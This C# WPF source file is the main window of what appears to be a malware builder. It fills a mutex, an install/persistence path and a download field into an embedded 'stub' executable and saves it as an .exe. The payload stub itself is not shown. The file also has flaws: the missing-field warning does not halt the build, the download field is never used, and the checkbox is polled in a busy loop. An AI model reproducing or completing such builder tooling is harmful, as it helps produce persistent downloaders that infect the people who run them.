using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Input;
using System.IO;

namespace Builder.Windows
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            mutexBox.Text = RandomString(10);
            checkIf();
        }

        // https://stackoverflow.com/a/1344242
        private static Random random = new Random();

        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }


        public async void checkIf()
        {
            await Task.Run(async () => {
                while (true)
                {
                    Dispatcher.Invoke(() => {
                        if ((bool)checkInstall.IsChecked)
                        {
                            persistenceBox.IsEnabled = true;
                        }
                        else
                        {
                            persistenceBox.IsEnabled = false;
                        }
                    });
                    await Task.Delay(10);
                }
            });
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            if (string.IsNullOrWhiteSpace(persistenceBox.Text) || string.IsNullOrWhiteSpace(mutexBox.Text) || string.IsNullOrWhiteSpace(downloadBox.Text))
            {
                MessageBox.Show("The fields need to be filled", "!", MessageBoxButton.OK, MessageBoxImage.Warning);
            }
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "Executable Files | *.exe";

            if (saveFileDialog.ShowDialog() == true)
            {
                if ((bool)checkInstall.IsChecked)
                {
                    DBuilder.Build(saveFileDialog.FileName, Properties.Resources.stub, new string[,] {
                        { "%install%", "true" },
                        { "%path%", persistenceBox.Text },
                        { "%mutex%", mutexBox.Text }
                    });
                }
                else
                {
                    DBuilder.Build(saveFileDialog.FileName, Properties.Resources.stub, new string[,] {
                        { "%install%", "false" },
                        { "%path%", "!" },
                        { "%mutex%", mutexBox.Text }
                    });
                }
            }
        }

        private void mutexBox_MouseEnter(object sender, MouseEventArgs e)
        {
            mutexBox.Text = RandomString(10);
        }
    }
}
